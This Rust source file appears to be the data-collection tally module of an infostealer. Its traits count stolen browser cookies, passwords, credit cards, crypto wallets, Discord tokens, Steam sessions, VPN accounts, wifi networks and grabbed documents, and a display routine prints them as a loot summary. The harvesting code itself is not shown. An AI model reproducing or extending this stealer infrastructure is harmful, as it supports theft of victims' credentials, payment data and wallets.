#![no_std]

extern crate alloc;

use core::fmt::{Display, Formatter};
use indoc::indoc;

pub mod atomic;

macro_rules! increase_count {
    ($name:ident) => {
        paste::paste! {
            fn [<increase_ $name _by>](&self, count: usize);

            fn [<increase_ $name>](&self) {
                self.[<increase_ $name _by>](1);
            }

            fn [<get_ $name>](&self) -> usize;
        }
    };
}

#[allow(unused_macros)]
macro_rules! flag {
    ($name:ident) => {
        paste::paste! {
            fn [<set_ $name>](&self);

            fn [<is_ $name>](&self) -> bool;
        }
    };
}

pub trait Browser: Send + Sync {
    increase_count!(cookies);
    increase_count!(passwords);
    increase_count!(credit_cards);
    increase_count!(auto_fills);
    increase_count!(history);
    increase_count!(bookmarks);
    increase_count!(downloads);
}

pub trait Software: Send + Sync {
    increase_count!(wallets);
    increase_count!(ftp_hosts);
    flag!(telegram);
    increase_count!(discord_tokens);
    increase_count!(steam_session);
}

pub trait FileGrabber: Send + Sync {
    increase_count!(source_code_files);
    increase_count!(database_files);
    increase_count!(documents);
}

pub trait Vpn: Send + Sync {
    increase_count!(accounts);
}

pub trait Device: Send + Sync {
    increase_count!(wifi_networks);
}

pub trait Collector: Send + Sync
{
    type Browser: Browser;
    type Software: Software;
    type FileGrabber: FileGrabber;
    type Vpn: Vpn;
    type Device: Device;

    fn get_browser(&self) -> &Self::Browser;

    fn get_software(&self) -> &Self::Software;

    fn get_file_grabber(&self) -> &Self::FileGrabber;

    fn get_vpn(&self) -> &Self::Vpn;

    fn get_device(&self) -> &Self::Device;
}

pub struct DisplayCollector<T: Collector>(pub T);

impl<T: Collector> Display for DisplayCollector<T> {
    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
        write!(
            f,
            indoc! {"
                ▶ Browser:
                  ├─ Cookies: {}
                  ├─ Passwords: {}
                  ├─ Credit cards: {}
                  ├─ Auto fills: {}
                  ├─ History: {}
                  ├─ Bookmarks: {}
                  └─ Downloads: {}
            "},
            self.0.get_browser().get_cookies(),
            self.0.get_browser().get_passwords(),
            self.0.get_browser().get_credit_cards(),
            self.0.get_browser().get_auto_fills(),
            self.0.get_browser().get_history(),
            self.0.get_browser().get_bookmarks(),
            self.0.get_browser().get_downloads(),
        )?;

        writeln!(f)?;

        write!(
            f,
            indoc! {"
                ▶ Software:
                  ├─ Wallets: {}
                  ├─ Ftp hosts: {}
                  ├─ Telegram: {}
                  ├─ Discord tokens: {}
                  └─ Steam sessions: {}
            "},
            self.0.get_software().get_wallets(),
            self.0.get_software().get_ftp_hosts(),
            self.0.get_software().is_telegram(),
            self.0.get_software().get_discord_tokens(),
            self.0.get_software().get_steam_session(),
        )?;

        writeln!(f)?;

        write!(
            f,
            indoc! {"
                ▶ Files:
                  ├─ Source code: {}
                  ├─ Database: {}
                  └─ Documents: {}
            "},
            self.0.get_file_grabber().get_source_code_files(),
            self.0.get_file_grabber().get_database_files(),
            self.0.get_file_grabber().get_documents(),
        )?;

        writeln!(f)?;

        write!(
            f,
            indoc! {"
                ▶ Vpn:
                  └─ Accounts: {}
            "},
            self.0.get_vpn().get_accounts(),
        )?;

        writeln!(f)?;

        write!(
            f,
            indoc! {"
                ▶ Device:
                  └─ Wifi networks: {}
            "},
            self.0.get_device().get_wifi_networks(),
        )
    }
}